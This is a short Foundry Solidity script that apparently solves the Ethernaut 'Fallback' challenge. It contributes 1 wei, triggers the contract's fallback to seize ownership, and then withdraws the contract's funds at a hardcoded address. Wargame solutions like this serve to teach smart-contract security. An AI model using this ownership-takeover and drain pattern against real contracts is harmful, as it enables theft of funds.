//SPDX-Licesnse-Identifier: MIT

pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Fallback} from "../src/Fallback.sol";

contract FallbackSolution is Script {
   Fallback public fallBack = Fallback(payable(0x7537F10E8BB1B05254E23D666E431964E61CB43a));

  function run() external {
    vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
    fallBack.contribute{value: 1 wei}();
    address(fallBack).call{value: 1 wei}("");
    fallBack.withdraw();
    console.log("New owner", fallBack.owner());
    console.log("My Address: ", vm.envAddress("MY_ADDRESS"));
    vm.stopBroadcast();
  }

  //   function run() external {
  //   vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
  //   helloEthernaut.authenticate(password);
  //   vm.stopBroadcast();
  // }

}